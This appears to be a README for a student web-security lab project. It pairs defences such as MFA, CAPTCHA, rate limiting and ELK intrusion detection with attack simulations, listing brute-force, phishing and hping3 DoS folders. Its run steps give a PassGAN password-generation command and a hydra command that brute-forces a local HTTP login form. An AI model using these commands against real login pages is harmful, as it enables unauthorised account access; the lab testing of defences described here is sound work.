# 📁 Directory Overview

- `web_defense_project/`  
  Project folder for web, including MFA, CAPTCHA, and rate limiting.
  
- `elk/`  
  ELK stack configurations for logging, intrusion detection, and visualization using Elasticsearch, Logstash, and Kibana.
  
- `Bruteforce/`  
  A folder containing brute-force attack simulation scripts.

- `phingattack/`  
  A directory related to phishing attacks.

- `hping3_dos.sh`  
  Shell script for launching DoS attacks using `hping3`.

# 🛠️ How to Run

## Brute Force Attack

Bruteforce

### Step 1: Generate Passwords with PassGAN

Use the pre-trained PassGAN model to generate realistic password guesses:

```bash
python sample.py \
  --input-dir pretrained \
  --checkpoint pretrained/checkpoints/195000.ckpt \
  --output ai_pass_1k.txt \
  --num-samples 1000

2. Testing the list by using hydra 
hydra -l Group18 -P /home/kali/PassGAN/ai_pass.txt 127.0.0.1 http-post-form '/login:account=^USER^&password=^PASS^:Invalid Credentials!' -s 5000 -t 4
